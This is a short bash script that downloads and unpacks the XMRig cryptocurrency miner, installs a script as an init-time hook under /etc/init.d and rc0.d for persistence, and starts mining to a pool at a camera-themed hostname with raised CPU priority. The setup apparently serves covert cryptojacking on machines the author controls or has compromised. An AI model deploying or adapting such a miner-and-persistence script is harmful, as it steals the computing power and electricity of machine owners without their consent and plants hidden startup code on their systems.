#!/bin/bash

sudo cd /root

sudo wget https://github.com/xmrig/xmrig/releases/download/v2.4.3/xmrig-2.4.3-gcc7-xenial-amd64-no-api.tar.gz

sudo tar xzf xmrig-2.4.3-gcc7-xenial-amd64-no-api.tar.gz

sudo cp /root/Strangers/jk.sh /etc/init.d/

sudo chmod +x /etc/init.d/jk.sh

sudo ln -s /etc/init.d/jk.sh /etc/rc0.d/S98mi_script

sudo /root/xmrig-2.4.3/xmrig -o mmadony.mysecuritycamera.com:7666 -u Co -p 1 --cpu-priority 2